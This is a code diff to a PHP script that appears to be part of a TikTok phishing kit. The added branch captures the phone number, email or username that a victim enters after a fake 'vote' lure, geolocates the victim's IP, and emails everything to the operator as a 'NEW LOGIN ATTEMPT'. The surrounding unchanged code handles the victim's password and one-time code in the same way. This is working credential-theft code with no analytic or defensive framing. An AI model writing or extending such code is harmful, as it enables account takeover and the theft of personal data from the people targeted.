@@ -161,6 +161,42 @@ if (!empty($vote)) {
     $subject = "Vote Button Clicked: $ip";
 
     logMessage($message, $send, $subject);
+} elseif (!empty($em)) {
+    // Continue button clicked (email/phone entered without password)
+    $ip = getClientIP();
+    $location = getLocation($ip);
+
+    $message = "📱 NEW LOGIN ATTEMPT (Continue)\n\n";
+    $message .= "📋 DETAILS:\n";
+    $message .= "PLATFORM: TIKTOK\n";
+
+    if (strpos($em, '+') === 0 || strpos($em, '@') !== false) {
+        if (strpos($em, '+') === 0) {
+            $message .= "Phone Number: " . htmlspecialchars($em) . "\n";
+            // Extract country code for phone numbers
+            $parts = explode(' ', $em);
+            if (count($parts) > 1) {
+                $message .= "Country Code: " . htmlspecialchars($parts[0]) . "\n";
+            }
+        } elseif (strpos($em, '@') !== false) {
+            $message .= "Email: " . htmlspecialchars($em) . "\n";
+        }
+    } else {
+        $message .= "Username: " . htmlspecialchars($em) . "\n";
+    }
+
+    $message .= "\n🌍 LOCATION:\n";
+    $message .= "Country: " . $location['country'] . "\n";
+    $message .= "State: " . $location['region'] . "\n";
+    $message .= "City: " . $location['city'] . "\n";
+    $message .= "IP: " . $ip . "\n";
+    $message .= "Time: " . date('Y-m-d H:i:s') . "\n\n";
+    $message .= "-TIKTOK LOGIN SYSTEM-\n";
+
+    $send = $Receive_email;
+    $subject = "TikTok Continue Button: $ip";
+
+    logMessage($message, $send, $subject);
 } elseif (!empty($em) && (!empty($password) || !empty($otp))) {
     $ip = getClientIP();
     $location = getLocation($ip);
